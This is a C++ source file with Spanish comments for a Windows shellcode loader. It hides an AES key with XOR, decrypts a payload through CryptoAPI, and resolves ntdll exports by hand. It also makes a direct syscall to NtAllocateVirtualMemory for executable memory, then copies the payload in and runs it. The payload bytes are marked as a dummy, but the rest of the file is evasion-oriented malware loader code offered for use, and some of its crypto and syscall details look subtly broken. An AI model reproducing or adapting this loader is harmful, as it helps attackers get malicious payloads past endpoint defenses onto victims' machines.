#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <cstring>

// Shellcode cifrado con AES-256 (ejemplo dummy)
unsigned char encryptedShellcode[] = { 
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 
};
DWORD shellcodeSize = sizeof(encryptedShellcode);

// Clave AES ofuscada con XOR
unsigned char obfuscatedKey[] = { 
    0x89, 0xAB, 0xCD, 0xEF, 0x46, 0x78, 0x9A, 0xBC,
    0x91, 0xA2, 0xB3, 0xC4, 0xD5, 0xE6, 0xF7, 0x08,
    0x19, 0x2A, 0x3B, 0x4C, 0x5D, 0x6E, 0x7F, 0x80,
    0x29, 0x3A, 0x4B, 0x5C, 0x6D, 0x7E, 0x8F, 0x90 
};
const DWORD keySize = sizeof(obfuscatedKey);

// Deofuscación XOR simple
void XORDeobfuscate(BYTE* data, DWORD dataSize, BYTE* key, DWORD keySize) {
    for (DWORD i = 0; i < dataSize; i++) {
        data[i] ^= key[i % keySize];
    }
}

// Obtener dirección de función desde NTDLL sin usar GetProcAddress
FARPROC GetNativeProcAddress(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)ntdll +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD functions = (PDWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfFunctions);
    PDWORD names = (PDWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfNames);
    PWORD ordinals = (PWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        LPCSTR currentName = (LPCSTR)((DWORD_PTR)ntdll + names[i]);
        if (strcmp(functionName, currentName) == 0) {
            return (FARPROC)((DWORD_PTR)ntdll + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// Syscall stub para NtAllocateVirtualMemory (Windows 10/11) - Compatible con GCC
EXTERN_C NTSTATUS NtAllocateVirtualMemorySyscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect) {
    
    static DWORD syscallId = 0;
    if (syscallId == 0) {
        FARPROC funcAddress = GetNativeProcAddress("NtAllocateVirtualMemory");
        if (funcAddress) syscallId = ((BYTE*)funcAddress)[4];
    }

    NTSTATUS status;
    
    // Sintaxis de ensamblador para GCC
    asm volatile (
        "mov %%rcx, %%r10\n"
        "mov %1, %%eax\n"
        "syscall\n"
        : "=a" (status)
        : "r" (syscallId)
        : "%r10", "%rcx", "%r11", "memory"
    );

    return status;
}

// Descifrado con CryptoAPI
BOOL DecryptShellcode() {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BOOL success = FALSE;

    // Deofuscación de clave
    XORDeobfuscate(obfuscatedKey, keySize, (BYTE*)"\x6F\xBF\x12\xFA\x33\x7A\x22\x5C", 8);

    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }

    if (!CryptImportKey(hProv, obfuscatedKey, keySize, 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);

    BYTE iv[16] = { 0 };
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    success = CryptDecrypt(hKey, 0, TRUE, 0, encryptedShellcode, &shellcodeSize);

    // Limpieza
    SecureZeroMemory(obfuscatedKey, keySize);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    return success;
}

int main() {
    // 1. Descifrar shellcode
    if (!DecryptShellcode()) {
        return 1;
    }

    // 2. Asignar memoria ejecutable
    LPVOID memory = NULL;
    SIZE_T size = shellcodeSize;
    NTSTATUS status = NtAllocateVirtualMemorySyscall(
        GetCurrentProcess(),
        &memory,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status != 0) {
        return 1;
    }

    // 3. Copiar y ejecutar
    memcpy(memory, encryptedShellcode, shellcodeSize);

    // 4. Opcional: Cambiar permisos a PAGE_EXECUTE_READ
    DWORD oldProtect;
    VirtualProtect(memory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    ((void(*)())memory)();

    return 0;
}